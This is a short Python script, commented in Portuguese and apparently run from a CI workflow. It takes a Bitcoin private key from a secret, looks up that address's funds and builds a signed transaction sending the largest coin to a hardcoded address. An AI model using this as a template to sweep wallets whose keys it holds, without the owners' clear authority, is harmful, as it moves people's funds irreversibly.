import requests
import argparse
import sys
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

def sign_and_liquidate(block_num, wif_key):
    try:
        # 1. Carregar chave e endereço
        key = Key(wif_key, network='bitcoin')
        source_address = key.address()
        
        # 2. Buscar UTXOs reais (API Mempool)
        url = f"https://mempool.space/api/address/{source_address}/utxo"
        response = requests.get(url, timeout=15)
        utxos = response.json()
        
        if not utxos:
            return "" # Retorna vazio se não houver saldo

        # 3. Montar a Transação (Endereço Intermediário Benjamin)
        dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
        
        # Usa o maior UTXO disponível
        utxo = max(utxos, key=lambda x: x['value'])
        fee = 5000 # Taxa para garantir rapidez
        amount = utxo['value'] - fee

        if amount <= 0: return ""

        tx = Transaction(network='bitcoin')
        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'])
        tx.add_output(value=amount, address=dest_address)
        
        # 4. Assinar com a WIF vinda do Secret
        tx.sign([wif_key])
        return tx.raw_hex()

    except Exception:
        return ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--block", type=int)
    parser.add_argument("--passphrase", type=str)
    args = parser.parse_args()
    
    # O resultado deve ser a última linha impressa para o Workflow capturar
    result = sign_and_liquidate(args.block, args.passphrase)
    if result:
        print(result)
